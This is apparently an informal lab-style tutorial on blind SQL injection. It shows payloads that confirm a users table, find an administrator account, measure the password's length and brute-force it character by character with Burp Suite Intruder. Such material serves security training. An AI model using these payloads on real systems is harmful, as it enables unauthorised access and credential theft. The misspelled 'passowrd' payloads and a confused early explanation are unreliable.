Like always make a false, true statment.
Notice what happens when the statement is true and remember that,
for example, an image go missing.

so if we make a statement that is true, for example
is there a table called users? - 
if the image is missing, then there is a column called names.

This means, we will only be able to get a true or false as an answer.

How to ask if there is a table called users?
' anD (SELECT 'a' FROM users LIMIT 1)='a'--

The select statements is selecting anything from users,
if the table exists, it will mean 'a' like we wrote, so 
the code will look like this

'anD ('a')='a'--
'a' does equalls to 'a' so it is true
'anD true--

*the limit is used to limit the results to one record.


Now we can try to look for a admin username
' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--

The next step is to obtain the length of the password.
' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--

*Our true sign is a missing image, so if we indert this and get a missing image,
this means the length is greater then one, now we increase the number till finding the password length.


' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a'--   *image is missing(true)
' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>25)='a'--   *image appearing(fallse)
' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--   *image is missing(true)
' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)<21)='a'--   *image is missing(true)
' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--   *image is missing(true)

This means we have a user called administrator with a password length of 20.


The next stop is to use burp suite intruder to find out the password.
We will brute force every possibe password, going for each character one by one.

It will look like that
Is the first character of the password is a? 
Is the first character of the password is b?
Is the first character of the password is C?
...


Send the request with the vulnerable SQL to the intruder.
create the SQL injection like this in  the vulner part

' anD (SELECT SUBSTRING(passowrd,1,1) FROM users WHERE username='administrator')='a'--
*This checks if the first number of the string  is a

With the burp intruder add/select the character(in this case is a), the intruder will
change in each requst the character untill getting true.


PAYLOAD
Set the payload as brute force with min length of 1 and max length as 1 aswell

The length of the response usually be diffrent in the true response

Now after doing that and getting the first letter, you should go and get the second by
following the same steps.


But instead of following the same steps over and over, burp has a way to do it in one go.
You can manipulate 2 values at the same time using cluster bomb.

' anD (SELECT SUBSTRING(passowrd,1,1) FROM users WHERE username='administrator')='a'--
Instead of adding/selecting only the a, we will also add the first 1 in the code.

We have to change the attack type to cluster bomb.
Set the first set PAYLOAD type as numbers because the numbers is the first in the code and
we set it to squential from 0 to 20 with 1 step at the time.

And the second set is as we did earlier
"Set the payload as brute force with min length of 1 and max length as 1 aswell"

THATS IT!!
